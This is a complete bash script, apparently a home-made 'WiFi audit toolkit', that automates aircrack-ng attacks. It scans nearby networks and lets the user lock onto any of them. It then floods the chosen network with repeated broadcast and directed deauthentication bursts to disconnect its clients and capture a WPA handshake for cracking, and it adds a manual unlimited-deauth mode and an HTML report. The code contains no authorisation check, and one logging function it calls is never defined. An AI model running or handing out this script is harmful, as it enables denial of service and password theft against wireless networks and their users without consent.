#!/bin/bash
#==============================================================================
# 🦊 FATFOX SECURITY TOOLKIT v1.7.5 - WLAN1 + SCAN FIXED
# External adapter optimized
#==============================================================================

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'

log_error() { echo -e "${RED}[!] $1${NC}" >&2; }
log_success() { echo -e "${GREEN}[+] $1${NC}"; }
log_info() { echo -e "${BLUE}[+] $1${NC}"; }

log_banner() {
    echo -e "${PURPLE}
======================================
      FATFOX SECURITY TOOLKIT v1.7.5
   ✅ WLAN1 | ROBUST SCAN | PRODUCTION
======================================${NC}"
}

check_root() { [[ $EUID -eq 0 ]] || { log_error "sudo required!"; exit 1; }; }
check_deps() { command -v aircrack-ng >/dev/null || { log_error "sudo apt install aircrack-ng"; exit 1; }; }

# 🔥 FORCE WLAN1 + MONITOR MODE
setup_wlan1() {
    WLAN_IFACE="wlan1"
    log_info "🎯 Using external adapter: $WLAN_IFACE"
    
    # Kill conflicts
    airmon-ng check kill >/dev/null 2>&1
    systemctl stop NetworkManager >/dev/null 2>&1 || true
    pkill -f wpa_supplicant >/dev/null 2>&1 || true
    sleep 3
    
    # Start monitor (clean slate)
    ip link set "$WLAN_IFACE" down 2>/dev/null || true
    airmon-ng stop "$WLAN_IFACE"mon >/dev/null 2>/dev/null || true
    airmon-ng start "$WLAN_IFACE" | grep -q "monitor mode enabled" || log_error "Monitor failed!"
    
    WLAN_MON="${WLAN_IFACE}mon"
    log_success "✅ $WLAN_IFACE → $WLAN_MON ACTIVE"
}

init_dirs() { mkdir -p captures deauth reports; }

# 🔍 ROBUST SCAN (waits + retries)
scan_networks_robust() {
    local scan_prefix="captures/scan_$(date +%Y%m%d_%H%M%S)"
    
    log_info "📡 Scanning on $WLAN_MON (60s)..."
    echo "Waiting for networks..."
    
    # Run scan + wait for CSV
    airodump-ng "$WLAN_MON" -w "$scan_prefix" --output-format csv --write-interval 10 &
    local scan_pid=$!
    
    # Wait max 70s for CSV
    for i in {1..14}; do
        sleep 5
        if [[ -f "${scan_prefix}-01.csv" && -s "${scan_prefix}-01.csv" ]]; then
            kill "$scan_pid" 2>/dev/null
            log_success "✅ Scan complete: ${scan_prefix}-01.csv"
            break
        fi
        [[ $i -eq 14 ]] && { kill "$scan_pid" 2>/dev/null; log_error "Scan timeout!"; return 1; }
    done
    
    # Display networks (BSSID | SSID | CH | PWR)
    awk -F, '
    NR>1 && $1!="" && $14!="" && $14!="<length>" && $14!="" {
        printf "%2d: %s | %-20s | CH:%s | PWR:%s\n", NR-1, $1, $14, $4, $9
    }' "${scan_prefix}-01.csv"
    
    echo
    read -p "🎯 Select target (1-N) or 0=quit: " choice
    
    if [[ "$choice" == "0" ]]; then
        return 1
    fi
    
    local line_num=$((choice + 1))
    TARGET_BSSID=$(awk -v n="$line_num" 'NR==n {print $1}' FS=, "${scan_prefix}-01.csv")
    TARGET_SSID=$(awk -v n="$line_num" 'NR==n {gsub(/"/,"",$14); print $14}' FS=, "${scan_prefix}-01.csv")
    TARGET_CHAN=$(awk -v n="$line_num" 'NR==n {print $4}' FS=, "${scan_prefix}-01.csv")
    
    [[ -n "$TARGET_BSSID" ]] || { log_error "Invalid selection!"; return 1; }
    
    log_success "🎯 LOCKED: $TARGET_BSSID | $TARGET_SSID | CH:$TARGET_CHAN"
    echo "$TARGET_BSSID $TARGET_SSID $TARGET_CHAN"
}

# ⚡ DEAUTH + HANDSHAKE (wlan1 optimized)
capture_handshake() {
    local bssid="$1" ssid="$2" chan="$3"
    local ts=$(date +%Y%m%d_%H%M%S)
    local cap_base="captures/handshake_${ts}"
    local deauth_log="deauth/deauth_${ts}.log"
    
    log_info "🎯 Channel lock: $chan"
    iwconfig "$WLAN_MON" channel "$chan" >/dev/null 2>&1
    
    # Start targeted capture
    log_info "📡 Background capture..."
    airodump-ng "$WLAN_MON" --bssid "$bssid" --channel "$chan" \
        -w "$cap_base" --output-format pcap >/dev/null 2>&1 &
    local dump_pid=$!
    
    # Aggressive deauth (broadcast + directed)
    for burst in {1..25}; do
        echo "⚡ Burst $burst/25..." | tee -a "$deauth_log"
        
        # Broadcast deauth
        timeout 8 aireplay-ng -0 0 -a "$bssid" "$WLAN_MON" >>"$deauth_log" 2>&1 || true
        
        # Directed deauth (all clients)
        timeout 8 aireplay-ng -0 150 -a "$bssid" -c FF:FF:FF:FF:FF:FF "$WLAN_MON" >>"$deauth_log" 2>&1 || true
        
        sleep 6
        
        # Check handshake
        if [[ -f "${cap_base}-01.cap" ]] && 
           aircrack-ng "${cap_base}-01.cap" 2>/dev/null | grep -q "\[ 1 handshake\]"; then
            kill "$dump_pid" 2>/dev/null
            mv "${cap_base}-01.cap" "${cap_base}.cap"
            log_success "🎉 HANDSHAKE CONFIRMED! ${cap_base}.cap"
            echo "${cap_base}.cap"
            return 0
        fi
    done
    
    kill "$dump_pid" 2>/dev/null
    log_warn "No handshake (need active clients)"
    [[ -f "${cap_base}-01.cap" ]] && mv "${cap_base}-01.cap" "${cap_base}.cap"
    echo "${cap_base}.cap"
}

# 📊 CLEAN HTML REPORT
generate_report() {
    local cap_file="$1" bssid="$2" ssid="$3" chan="$4"
    local ts=$(date +%Y%m%d_%H%M%S)
    local html_file="reports/FATFOX_${ts}.html"
    
    local hs_count=$(aircrack-ng "$cap_file" 2>/dev/null | grep -oc "\[ 1 handshake\]" || echo 0)
    
    cat > "$html_file" << EOF
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>FATFOX: $ssid</title>
<style>body{font-family:system-ui;background:#0a0a0a;color:#fff;margin:0;padding:30px;max-width:1000px;margin:auto}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:40px;border-radius:20px;text-align:center;margin-bottom:40px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:25px;margin:40px 0}.stat{background:rgba(255,255,255,0.08);padding:30px;border-radius:16px;text-align:center}.stat h3{margin:0 0 15px;font-size:1.1em;opacity:0.8}.stat-value{font-size:3em;font-weight:700;margin:0;color:$([[ $hs_count -gt 0 ]] && echo '#4ade80' || echo '#ef4444')}.table{width:100%;border-collapse:collapse;margin:40px 0}.table th{background:#1a1a2a;padding:18px;font-weight:600}.table td{padding:15px;border-bottom:1px solid #333}.fix{background:#1a1a2e;padding:30px;border-radius:16px;margin:30px 0}.fix ol{margin:20px 0;padding-left:25px}</style></head>
<body>
<div class="header"><h1>🦊 FATFOX WIFI AUDIT</h1><p>Target: $ssid | $(date)</p></div>
<div class="stats">
<div class="stat"><h3>NETWORK</h3><div class="stat-value">$ssid</div></div>
<div class="stat"><h3>BSSID</h3><div class="stat-value">$bssid</div></div>
<div class="stat"><h3>HANDSHAKE</h3><div class="stat-value">$([[ $hs_count -gt 0 ]] && echo '✅' || echo '❌') $hs_count</div></div>
<div class="stat"><h3>CHANNEL</h3><div class="stat-value">$chan</div></div>
</div>
<table class="table"><tr><th>Risk</th><th>CVSS</th><th>Status</th></tr>
<tr><td>Handshake Exposure</td><td>8.1 HIGH</td><td>$([[ $hs_count -gt 0 ]] && echo '✅ CRACKABLE' || echo '❌ None')</td></tr>
<tr><td>Deauth DoS</td><td>7.5 HIGH</td><td>✅ Vulnerable</td></tr></table>
<div class="fix"><h3>🚨 PRIORITY FIXES</h3><ol>
<li>WPA3-Enterprise NOW</li><li>802.11w Protected Frames</li><li>PSK rotation immediate</li><li>Disable WPA2-PSK legacy</li></ol></div>
<p><strong>Proof:</strong> <code>$(basename "$cap_file")</code></p>
</body></html>
EOF
    
    xdg-open "$html_file" 2>/dev/null || log_info "Saved: $html_file"
    log_success "📊 Report ready!"
}

cleanup_old() {
    find captures -name "*scan*" -mmin +120 -delete 2>/dev/null || true
    find deauth -name "*.log" -mtime +3 -delete 2>/dev/null || true
}

# 🎮 MAIN LOOP
while true; do
    clear
    log_banner
    echo "🎯 EXTERNAL ADAPTER: wlan1"
    check_root && check_deps && init_dirs
    setup_wlan1
    
    echo "1. 🔍 SCAN + PICK TARGET"
    echo "2. 🎯 AUTO DEAUTH + HANDSHAKE"
    echo "3. ⚡ MANUAL DEAUTH"
    echo "4. 📊 REPORT (latest)"
    echo "5. 🧹 CLEANUP"
    echo "0. ❌ QUIT"
    read -p "➤ " choice
    
    case "$choice" in
        1) scan_networks_robust ;;
        2) 
            read -r bssid ssid chan <<< "$(scan_networks_robust)" || continue
            cap=$(capture_handshake "$bssid" "$ssid" "$chan")
            generate_report "$cap" "$bssid" "$ssid" "$chan"
            ;;
        3) 
            read -p "BSSID: " bssid
            read -p "CH: " chan
            iwconfig "$WLAN_MON" channel "$chan"
            aireplay-ng -0 0 -a "$bssid" "$WLAN_MON"
            ;;
        4) 
            latest_cap=$(ls -t captures/*.cap 2>/dev/null | head -1)
            [[ -f "$latest_cap" ]] && generate_report "$latest_cap" "???" "???" "???" || log_error "No captures!"
            ;;
        5) cleanup_old ;;
        0) log_success "✅ Complete!"; exit 0 ;;
        *) log_error "1-5 only!" ;;
    esac
    
    read -p $'\n🔄 Press Enter...'
    airmon-ng stop "$WLAN_MON" >/dev/null 2>&1 || true
done
